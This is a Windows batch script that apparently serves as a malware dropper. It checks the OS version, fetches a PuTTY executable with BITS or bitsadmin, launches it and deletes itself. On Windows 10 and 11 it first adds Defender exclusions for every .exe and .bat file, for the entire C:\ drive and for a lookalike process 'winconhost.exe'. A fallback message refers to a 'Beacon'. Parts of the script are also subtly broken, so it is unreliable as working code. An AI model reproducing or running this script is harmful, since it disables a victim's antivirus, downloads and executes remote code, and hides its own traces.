@echo off

set Version=

ver | findstr /i "6.1." > nul && set Version=Windows 7
ver | findstr /i "6.2." > nul && set Version=Windows 8
ver | findstr /i "6.3." > nul && set Version=Windows 8.1
ver | findstr /i "10.0." > nul && set Version=Windows 10
ver | findstr /i "10.0.22000." > nul && set Version=Windows 11

if "%Version%" == "Windows 7" (
        set file_name=putty.exe
        set download_path=%temp%\
        set url=https://the.earth.li/~sgtatham/putty/0.78/w64/putty.exe
        powershell Start-BitsTransfer -Source %url% -Destination %download_path%\%file_name%
        start "" %download_path%\%file_name%
        DEL "%~f0"
) else if "%Version%" == "Windows 8" ( 
        set file_name=putty.exe
        set download_path=%temp%\
        set url=https://the.earth.li/~sgtatham/putty/0.78/w64/putty.exe
        powershell Start-BitsTransfer -Source %url% -Destination %download_path%\%file_name%
        start "" %download_path%\%file_name%
        DEL "%~f0"
) else if "%Version%" == "Windows 8.1" (
        set file_name=putty.exe
        set download_path=%temp%\
        set url=https://the.earth.li/~sgtatham/putty/0.78/w64/putty.exe
        powershell Start-BitsTransfer -Source %url% -Destination %download_path%\%file_name%
        start "" %download_path%\%file_name%
        DEL "%~f0"
) else if "%Version%" == "Windows 10" (
        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
        powershell -Command Add-MpPreference -ExclusionPath "C:\"
        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
        set pOut="%temp%\\putty.exe"
        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
        start "" %pOut%
        DEL "%~f0"
) else if "%Version%" == "Windows 11" (
        powershell -Command Add-MpPreference -ExclusionExtension ".exe"
        powershell -Command Add-MpPreference -ExclusionPath "C:\"
        powershell -Command Add-MpPreference -ExclusionExtension ".bat"
        powershell -Command Add-MpPreference -ExclusionProcess "winconhost.exe"
        set pOut="%temp%\\putty.exe"
        bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" %pOut%
        start "" %pOut%
        DEL "%~f0"
) else (
    echo Beacon unble to read System Files
)
